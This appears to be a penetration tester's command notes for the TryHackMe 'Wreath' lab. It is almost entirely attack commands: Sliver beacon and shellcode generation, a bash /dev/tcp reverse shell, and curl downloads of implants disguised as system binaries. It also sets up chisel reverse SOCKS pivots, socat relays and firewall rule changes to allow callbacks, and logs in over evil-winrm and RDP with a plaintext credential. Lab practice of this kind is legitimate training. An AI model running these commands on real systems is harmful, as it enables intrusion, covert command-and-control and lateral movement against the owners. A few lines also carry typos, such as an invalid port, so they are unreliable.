...
```bash
sed -i 's/10.250.180.2/10.250.180.2/g' *-CMD-by-CMDs.md
sed -i 's/10.200.180.200/10.200.180.200/g' *-CMD-by-CMDs.md
sed -i 's/10.200.180.150/10.200.180.150/g' *-CMD-by-CMDs.md
sed -i 's/10.200.180.100/10.200.180.100/g' *-CMD-by-CMDs.md

sed -i 's/10.50.55.42/10.250.180.2/g' *-Writeup.md
sed -i 's/10.200.57.200/10.200.180.200/g' *-Writeup.md
sed -i 's/10.200.57.150/10.200.180.150/g' *-Writeup.md
sed -i 's/10.200.57.100/10.200.180.100/g' *-Writeup.md
```

```bash
echo "10.200.180.200 thomaswreath.thm thomaswreath.thm.evil.com" | sudo tee -a /etc/hosts
# Sliver
## Prod
generate beacon --http 10.250.180.2:2222 --arch amd64 --os linux --save /home/kali/Wreath/www-infil/PROD-SERV-S
## Git
#### GIT pivot
generate --tcp-pivot 10.200.180.200:9898 --arch amd64 --os windows --save /home/kali/Wreath/GIT-SERV-S-Pivot.bin -f shellcode -G
...
generate beacon --http 10.200.180.200:10005 --arch amd64 --os windows --save /home/kali/Wreath/GIT-SERV-S.bin -f shellcode -G
...
generate beacon --http 10.200.180.150:10010 --arch amd64 --os windows --save /home/kali/Wreath/PERSONAL.bin -f shellcode -G
...
bash -i >& /dev/tcp/10.250.180.2/9999 0>&1

# Get two shell 8443,3333
curl http://10.250.180.2/chisel -o chisel
curl http://10.250.180.2/PROD-SERV-S -o systemCtl
curl http://10.250.180.2/socatx64.bin -o socat

curl http://10.250.180.2/ppc-Powerpnt.exe -o Powerpnt.exe
curl http://10.250.180.2/git-cmd.exe -o cmd.exe
...
nohup ./chisel client -v 10.250.180.2:10000 R:127.0.0.1:10002:10.200.180.150:80 &
...
proxychains4 evil-winrm -u 'nvm' -p 'nvmNVM69!' -i 10.200.180.150
upload www-infil/chisel.exe


# xfreerdp as we need UAC for administrative usage
proxychains4 xfreerdp /v:10.200.180.150 /u:nvm /p:'nvmNVM69!' +clipboard /dynamic-resolution 
...
nohup ./chisel client -v 10.250.180.2:10000 R:10005:socks &
firewall-cmd --zone=public --add-port 9898/tcp
...
# start-job { .\chisel.exe client -v 10.250.180.2:10000 R:10005:10.200.180.150:10005:10.200.180.200:socks  }

# Personal Sliver -> git -> prod-server -> chisel 
# Prod
firewall-cmd --zone=public --add-port 10010/tcp
nohup ./chisel client -v 10.250.180.2:10000 R:10010:socks &
# gitstack, add a rule and a reverse socks proxy 
netsh advfirewall firewall add rule name="nvmChisel-PPC" dir=in action=allow protocol=tcp localport=10010
start-job { .\chisel.exe client -v 10.250.180.2:10000 R:10010:10.200.180.150:100010:10.200.180.200:socks  }

users\


# For git-serv reverse shell
nohup ./chisel client -v 10.250.180.2:10000 R:10003:socks &
...
nohup ./socat tcp-l:10004 tcp:10.250.180.2:10004 &
...
# powershell shell
nohup ./socat tcp-l:10003 tcp:10.250.180.2:10003 &
# Socat relay on prod
